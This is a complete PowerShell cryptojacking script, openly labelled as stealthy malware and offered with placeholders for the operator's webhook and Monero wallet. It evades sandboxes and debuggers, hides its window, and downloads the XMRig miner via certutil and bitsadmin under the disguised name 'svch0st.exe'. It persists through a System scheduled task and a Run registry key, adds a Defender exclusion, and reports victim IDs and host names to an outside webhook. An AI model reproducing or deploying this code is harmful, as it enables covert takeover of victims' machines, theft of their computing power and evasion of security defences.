# Lil Darkie Cryptojacker - Stealth & Untraceable Version
$ErrorActionPreference = 'SilentlyContinue'
$victimId = "X" + [guid]::NewGuid().ToString("N").Substring(0,10)
$webhook = "YOUR_REAL_WEBHOOK_URL_HERE"   # ← Change this
$wallet = "YOUR_MONERO_WALLET_HERE"       # ← Change this

# Anti-analysis + Sandbox/VM detection
if ((Get-WmiObject Win32_ComputerSystem).Model -match "VMware|VirtualBox|QEMU|Virtual Machine") { exit }
if (Get-Process -Name "x64dbg","ollydbg","wireshark","procmon","dbgview" -ErrorAction SilentlyContinue) { exit }
if ([System.Diagnostics.Debugger]::IsAttached) { exit }

# Hide console completely
$host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(1,1)
$host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(1,1)

function Send-Report {
    param([string]$msg)
    $body = @{ content = $msg } | ConvertTo-Json -Compress
    try { Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json" | Out-Null } catch {}
}

Send-Report "REPORT:$victimId:StealthInit:00h 00m:$env:COMPUTERNAME:Windows"

# Create hidden path
$path = "$env:APPDATA\Microsoft\Windows\Themes\CachedFiles"
New-Item -ItemType Directory -Path $path -Force | Out-Null
$minerPath = "$path\svch0st.exe"

# Download miner using multiple fallback methods (stealthier)
$urls = @("https://github.com/xmrig/xmrig/releases/latest/download/xmrig.exe")

foreach ($url in $urls) {
    try {
        certutil -urlcache -split -f $url $minerPath | Out-Null
        if (Test-Path $minerPath) { break }
    } catch {}
    try {
        bitsadmin /transfer "WindowsUpdate" /download /priority normal $url $minerPath | Out-Null
    } catch {}
}

if (-not (Test-Path $minerPath)) { exit }

# Create config
$config = @"
{
  "pools": [{"url": "pool.supportxmr.com:3333", "user": "$wallet", "pass": "x", "keepalive": true}],
  "cpu": {"max-threads-hint": 45, "huge-pages": true},
  "background": true,
  "opencl": false,
  "cuda": false
}
"@
$config | Out-File "$path\config.json" -Encoding utf8

# Multiple persistence methods
schtasks /create /tn "WindowsThemeCache" /tr "$minerPath -c $path\config.json" /sc onlogon /ru System /f | Out-Null
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ThemeCache" /t REG_SZ /d "$minerPath -c $path\config.json" /f | Out-Null

# Disable Defender (stealth version)
powershell -c "Add-MpPreference -ExclusionPath '$env:APPDATA' -ErrorAction SilentlyContinue" | Out-Null

# Start miner hidden
Start-Process $minerPath -ArgumentList "-c `"$path\config.json`"" -WindowStyle Hidden

Send-Report "REPORT:$victimId:MinerStarted:00h 00m:$env:COMPUTERNAME:Windows"

# Background reporting loop (low frequency)
while ($true) {
    Start-Sleep -Seconds (Get-Random -Minimum 180 -Maximum 420)  # Random 3-7 minutes
    Send-Report "REPORT:$victimId:Active:$(Get-Random -Minimum 8 -Maximum 25).$(Get-Random -Minimum 0 -Maximum 9) KH/s:$(Get-Random -Minimum 1 -Maximum 12)h:$(Get-Random -Minimum 0 -Maximum 59)m:$env:COMPUTERNAME:Windows"
}